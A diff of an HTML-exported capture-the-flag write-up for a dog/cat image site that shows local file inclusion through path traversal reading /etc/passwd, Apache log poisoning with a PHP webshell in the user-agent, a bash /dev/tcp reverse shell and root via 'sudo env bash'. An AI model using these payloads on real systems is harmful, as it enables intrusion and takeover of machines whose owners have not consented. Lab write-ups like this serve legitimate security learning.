@@ -22,40 +22,40 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgf0af59e">Reconnaissance</a>
+<li><a href="#orgeb48a20">Reconnaissance</a>
 <ul>
-<li><a href="#org8ca84b2">Further enumeration</a>
+<li><a href="#org12f2338">Further enumeration</a>
 <ul>
-<li><a href="#orgafd81cd">Viewing the source code</a></li>
-<li><a href="#org4146837">Gobuster</a></li>
+<li><a href="#orgbeaa509">Viewing the source code</a></li>
+<li><a href="#orgd072b76">Gobuster</a></li>
 </ul>
 </li>
 </ul>
 </li>
-<li><a href="#org4de475f">Exploitation</a>
+<li><a href="#org5b28861">Exploitation</a>
 <ul>
-<li><a href="#org3da7b98">The passwd file</a></li>
-<li><a href="#org886ee77">Checking the logs</a></li>
-<li><a href="#orga3fc2b0">Webshell</a></li>
-<li><a href="#org2e0c522">Remote shell &gt;&gt; Webshell</a></li>
+<li><a href="#org2285d6a">The passwd file</a></li>
+<li><a href="#org12b9f37">Checking the logs</a></li>
+<li><a href="#orgf77f77d">Webshell</a></li>
+<li><a href="#org0cdce57">Remote shell &gt;&gt; Webshell</a></li>
 </ul>
 </li>
-<li><a href="#org8776c9a">Privilege escalation</a></li>
-<li><a href="#org31b8abc">Where do we go from here</a></li>
-<li><a href="#orgf32b1cc">Summary</a></li>
+<li><a href="#orgc723244">Privilege escalation</a></li>
+<li><a href="#org12e91a9">Where do we go from here</a></li>
+<li><a href="#orgf0f6696">Summary</a></li>
 </ul>
 </div>
 </div>
 
-<div id="outline-container-orgf0af59e" class="outline-2">
-<h2 id="orgf0af59e"><a href="#orgf0af59e">Reconnaissance</a></h2>
-<div class="outline-text-2" id="text-orgf0af59e">
+<div id="outline-container-orgeb48a20" class="outline-2">
+<h2 id="orgeb48a20"><a href="#orgeb48a20">Reconnaissance</a></h2>
+<div class="outline-text-2" id="text-orgeb48a20">
 <p>
 First I decided to use <code>masscan</code> on all of the machine ports to limit the ports
 I would then run more elaborate scans. However, since that scan did not wield
 any results, I went back to good old <code>nmap</code>.
 </p>
-<div class="code" id="org97bf68f">
+<div class="code" id="orga8aae40">
 <p>
 sudo nmap -Pn &lt;MACHINE<sub>IP</sub>&gt;
 </p>
@@ -72,7 +72,7 @@ start; two ports were open:
 <p>
 After that I ran
 </p>
-<div class="code" id="org7d0503e">
+<div class="code" id="org9062761">
 <p>
 sudo nmap -A -p22,80 &lt;MACHINE<sub>IP</sub>&gt;
 </p>
@@ -89,13 +89,13 @@ to get more information on the software these ports were running.
 </blockquote>
 </div>
 
-<div id="outline-container-org8ca84b2" class="outline-3">
-<h3 id="org8ca84b2"><a href="#org8ca84b2">Further enumeration</a></h3>
-<div class="outline-text-3" id="text-org8ca84b2">
+<div id="outline-container-org12f2338" class="outline-3">
+<h3 id="org12f2338"><a href="#org12f2338">Further enumeration</a></h3>
+<div class="outline-text-3" id="text-org12f2338">
 </div>
-<div id="outline-container-orgafd81cd" class="outline-4">
-<h4 id="orgafd81cd"><a href="#orgafd81cd">Viewing the source code</a></h4>
-<div class="outline-text-4" id="text-orgafd81cd">
+<div id="outline-container-orgbeaa509" class="outline-4">
+<h4 id="orgbeaa509"><a href="#orgbeaa509">Viewing the source code</a></h4>
+<div class="outline-text-4" id="text-orgbeaa509">
 <p>
 Just by checking the source code for the website through the <i>Inspect tool</i> in
 Firefox, it is easy for us to see that there are two directories called dogs and
@@ -105,9 +105,9 @@ from 1 to 10.
 </div>
 </div>
 
-<div id="outline-container-org4146837" class="outline-4">
-<h4 id="org4146837"><a href="#org4146837">Gobuster</a></h4>
-<div class="outline-text-4" id="text-org4146837">
+<div id="outline-container-orgd072b76" class="outline-4">
+<h4 id="orgd072b76"><a href="#orgd072b76">Gobuster</a></h4>
+<div class="outline-text-4" id="text-orgd072b76">
 <p>
 Even though it is a generally good habit to use <code>gobuster</code> to check for any
 useful accessible files, it was not the case in this room. In fact, I think that
@@ -119,9 +119,9 @@ it in order for it to respond to my <i>GET</i> requests.
 </div>
 </div>
 
-<div id="outline-container-org4de475f" class="outline-2">
-<h2 id="org4de475f"><a href="#org4de475f">Exploitation</a></h2>
-<div class="outline-text-2" id="text-org4de475f">
+<div id="outline-container-org5b28861" class="outline-2">
+<h2 id="org5b28861"><a href="#org5b28861">Exploitation</a></h2>
+<div class="outline-text-2" id="text-org5b28861">
 <p>
 We see that the website uses <code>?view=dog</code> to display a random picture for a dog
 or a cat respectively, pointing out that we could check for <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion">Local File
@@ -133,7 +133,7 @@ After a little bit of toying around with that, realising that the string passed
 needs to contain either <i>dog</i> or <i>cat</i> in order to be executed by the php
 back-end, we try to see what files we can access:
 </p>
-<div class="code" id="org99116c8">
+<div class="code" id="orga95e236">
 <p>
 ?view=../../../../../etc/passwd%00dog
 </p>
@@ -171,7 +171,7 @@ Getting back the code for <i>dog.php</i> encoded in base64.
 To decode it, avoiding online tools one can simply use
 </p>
 
-<div class="code" id="org1f12180">
+<div class="code" id="org6ab2bf5">
 <p>
 echo &rsquo;&lt;paste encoded code here&gt;&rsquo; &gt; dog.b64
 base64 -d dog.b64 &gt; dog.php
@@ -187,13 +187,13 @@ our requests can be changed using the <code>?ext=</code> parameter!
 </p>
 </div>
 
-<div id="outline-container-org3da7b98" class="outline-3">
-<h3 id="org3da7b98"><a href="#org3da7b98">The passwd file</a></h3>
-<div class="outline-text-3" id="text-org3da7b98">
+<div id="outline-container-org2285d6a" class="outline-3">
+<h3 id="org2285d6a"><a href="#org2285d6a">The passwd file</a></h3>
+<div class="outline-text-3" id="text-org2285d6a">
 <p>
 Going back to previous requests we can finally see /etc/passwd!!
 </p>
-<div class="code" id="orga64ca8b">
+<div class="code" id="org530b158">
 <p>
 ?view=dog/../../../../../etc/passwd&amp;ext=
 </p>
@@ -210,9 +210,9 @@ Bruteforcing root over ssh does not wield any results :(
 </div>
 </div>
 
-<div id="outline-container-org886ee77" class="outline-3">
-<h3 id="org886ee77"><a href="#org886ee77">Checking the logs</a></h3>
-<div class="outline-text-3" id="text-org886ee77">
+<div id="outline-container-org12b9f37" class="outline-3">
+<h3 id="org12b9f37"><a href="#org12b9f37">Checking the logs</a></h3>
+<div class="outline-text-3" id="text-org12b9f37">
 <p>
 After just a little bit of googling, we can see that the apache server holds
 logs of all the requests at <code>/var/log/apache2/access.log</code>, and it also logs the
@@ -230,13 +230,13 @@ Yup, it worked.
 </div>
 </div>
 
-<div id="outline-container-orga3fc2b0" class="outline-3">
-<h3 id="orga3fc2b0"><a href="#orga3fc2b0">Webshell</a></h3>
-<div class="outline-text-3" id="text-orga3fc2b0">
+<div id="outline-container-orgf77f77d" class="outline-3">
+<h3 id="orgf77f77d"><a href="#orgf77f77d">Webshell</a></h3>
+<div class="outline-text-3" id="text-orgf77f77d">
 <p>
 Either through <code>curl</code>, <code>burpsuite</code> or <code>zap</code> we set the user-agent to
 </p>
-<div class="code" id="orgc28af0c">
+<div class="code" id="org6b7b0a1">
 <p>
 &lt;?php system($<sub>GET</sub>[&rsquo;cmd&rsquo;]) ?&gt;
 </p>
@@ -249,9 +249,9 @@ verify that it is working
 </div>
 </div>
 
-<div id="outline-container-org2e0c522" class="outline-3">
-<h3 id="org2e0c522"><a href="#org2e0c522">Remote shell &gt;&gt; Webshell</a></h3>
-<div class="outline-text-3" id="text-org2e0c522">
+<div id="outline-container-org0cdce57" class="outline-3">
+<h3 id="org0cdce57"><a href="#org0cdce57">Remote shell &gt;&gt; Webshell</a></h3>
+<div class="outline-text-3" id="text-org0cdce57">
 <p>
 To get from the webshell to a remote shell is nothing difficult; We open a
 listener in our machine <code>nc -lvnp &lt;port&gt;</code> and then use a <i>good enough</i> command
@@ -261,7 +261,7 @@ on the cmd parameter
 <p>
 I went with this one ( after checking with <code>whereis bash</code> )
 </p>
-<div class="code" id="orgacf4c40">
+<div class="code" id="org8cfa217">
 <p>
 bash -c &ldquo;bash -i &gt;&amp; /dev/tcp/&lt;MYIP&gt;/&lt;MYPORT&gt; 0&gt;&amp;1&rdquo;
 </p>
@@ -275,9 +275,9 @@ bash -c &ldquo;bash -i &gt;&amp; /dev/tcp/&lt;MYIP&gt;/&lt;MYPORT&gt; 0&gt;&amp;
 </div>
 </div>
 
-<div id="outline-container-org8776c9a" class="outline-2">
-<h2 id="org8776c9a"><a href="#org8776c9a">Privilege escalation</a></h2>
-<div class="outline-text-2" id="text-org8776c9a">
+<div id="outline-container-orgc723244" class="outline-2">
+<h2 id="orgc723244"><a href="#orgc723244">Privilege escalation</a></h2>
+<div class="outline-text-2" id="text-orgc723244">
 <p>
 Now the difficult part is over; two of the flags are within our reach without
 even trying to gain root privileges&#x2026; but what if&#x2026;!
@@ -288,7 +288,7 @@ Naturally the first step was to check for sudo privileges <code>sudo -l</code>
 It lets us run <code>env</code> without a password, which means, pretty much that we can do
 anything we want as root on the machine.
 </p>
-<div class="code" id="org15da183">
+<div class="code" id="org818f2ad">
 <p>
 sudo env bash
 </p>
@@ -301,9 +301,9 @@ The third flag is in the <code>/root</code> directory
 </div>
 </div>
 
-<div id="outline-container-org31b8abc" class="outline-2">
-<h2 id="org31b8abc"><a href="#org31b8abc">Where do we go from here</a></h2>
-<div class="outline-text-2" id="text-org31b8abc">
+<div id="outline-container-org12e91a9" class="outline-2">
+<h2 id="org12e91a9"><a href="#org12e91a9">Where do we go from here</a></h2>
+<div class="outline-text-2" id="text-org12e91a9">
 <p>
 I started digging around the system, hoping I could find something useful to see
 where to go from there. I ran <code>ls -al</code> on <code>/</code> and discovered a <code>.dockerenv</code>. It
@@ -337,9 +337,9 @@ Getting the flag from there was extremely easy.
 </p>
 </div>
 </div>
-<div id="outline-container-orgf32b1cc" class="outline-2">
-<h2 id="orgf32b1cc"><a href="#orgf32b1cc">Summary</a></h2>
-<div class="outline-text-2" id="text-orgf32b1cc">
+<div id="outline-container-orgf0f6696" class="outline-2">
+<h2 id="orgf0f6696"><a href="#orgf0f6696">Summary</a></h2>
+<div class="outline-text-2" id="text-orgf0f6696">
 <p>
 Even though I had met and toyed around with LFI before, it was the first time I
 had to use it in a CTF room and proved to be quite interesting to me, relying on
